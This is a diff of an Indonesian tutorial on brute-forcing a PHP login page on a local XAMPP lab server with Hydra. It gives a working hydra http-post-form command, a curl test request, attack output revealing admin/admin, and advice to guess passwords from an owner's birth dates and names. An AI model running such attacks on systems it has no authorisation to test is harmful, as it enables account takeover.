@@ -46,7 +46,7 @@ saya di sini mengunakan server localhost  yaitu xampp  pertama download folder *
  di linux alian simpan folder **`user dan password`** di linux yang penting file  pass.txt dan user.txt muda di jangkau <br>
  lalu kita mulai penetrasi server  pastikan server on jika suda buka terminal  sadisini mengunakan  **`kali linux`**
  ````
-sudo apt update <br>
+sudo apt update 
 sudo apt install hydra
 
  ````
@@ -55,8 +55,52 @@ jika suda launjutmengamati target reaksi yang di timbul  contohnya pada **`pe/lo
 ````
 curl -X POST -d "username=admin&password=admi" http://192.168.1.2/pe/low.php
 ````
+maka ouputnya akan seperti ini
+```
+┌──(udi㉿akhmadpc)-[~/Documents]
+└─$ curl -X POST -d "username=admin&password=admi" http://192.168.1.2/pe/low.php                                                                                      
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Login</title>
+</head>
+<body>
+    <h2>Form Login low</h2>
+    <form method="post" action="">
+        Username: <input type="text" name="username" required><br>
+        Password: <input type="password" name="password" required><br>
+        <input type="submit" value="Login">
+    </form>
+    <p>Login gagal. Username atau password salah.</p>
+</body>
+</html>
+
+```
+
 
 jika suda mendapatakan target yanng d tentukan maka launjut menyesuaikan **`hydra -L user.txt -P pass.txt -t 4 -V 192.168.1.2 http-post-form "/pe/low.php:username=^USER^&password=^PASS^:Login gagal. Username atau password salah." | tee -a fixpassworddanuser.txt`**
 
 dan tunggu proseser penetrasi sampai selesai 
- 
+<br> jika selesai maka buka file **`fixpassworddanuser.txt`** pada folder yang ada tentukan sebelumnya atau di tepat **`pass.txt dan user.txt`** di simpan lalu buka pada file tersebut berisi hasil dari brute suite yang telah di kerjakan 
+````
+[ATTEMPT] target 192.168.1.2 - login "123456" - pass "password!2024" - 170 of 28900 [child 3] (0/0)
+[ATTEMPT] target 192.168.1.2 - login "admin" - pass "123456" - 171 of 28900 [child 2] (0/0)
+[ATTEMPT] target 192.168.1.2 - login "admin" - pass "admin" - 172 of 28900 [child 1] (0/0)
+[ATTEMPT] target 192.168.1.2 - login "admin" - pass "password" - 173 of 28900 [child 0] (0/0)
+[ATTEMPT] target 192.168.1.2 - login "admin" - pass "123456789" - 174 of 28900 [child 3] (0/0)
+[ATTEMPT] target 192.168.1.2 - login "admin" - pass "12345678" - 175 of 28900 [child 2] (0/0)
+[80][http-post-form] host: 192.168.1.2   login: admin   password: admin
+[ATTEMPT] target 192.168.1.2 - login "password" - pass "123456" - 341 of 28900 [child 1] (0/0)
+[ATTEMPT] target 192.168.1.2 - login "password" - pass "admin" - 342 of 28900 [child 0] (0/0)
+[ATTEMPT] target 192.168.1.2 - login "password" - pass "password" - 343 of 28900 [child 3] (0/0)
+````
+
+
+Ciri-ciri login berhasil dari hasil brute force menggunakan Hydra adalah: <br>
+### Log dengan format [80][http-post-form]: Baris ini menunjukkan bahwa Hydra telah berhasil melakukan login menggunakan kombinasi username dan password tertentu.
+dari contoh di atas sudah di pastikan bahwa **`[80][http-post-form] host: 192.168.1.2   login: admin   password: admin`** adalah user dan password **`admin`** 
+
+## perlu di perhatikan 
+user dan password perlu di teliti lagi diman key yang di gunakan memiliki banyaka variasi kita harus mengetahu data dari pemilik server, Saat mencoba masuk ke akun, penting untuk tahu bahwa orang sering menggunakan nama atau tanggal lahir mereka sebagai username atau password. Jika kita tahu sedikit tentang orang yang memiliki akun, seperti tanggal lahirnya, kita bisa mencoba kombinasi yang mungkin mereka gunakan. Ini bisa membantu kita menemukan password yang benar lebih cepat.
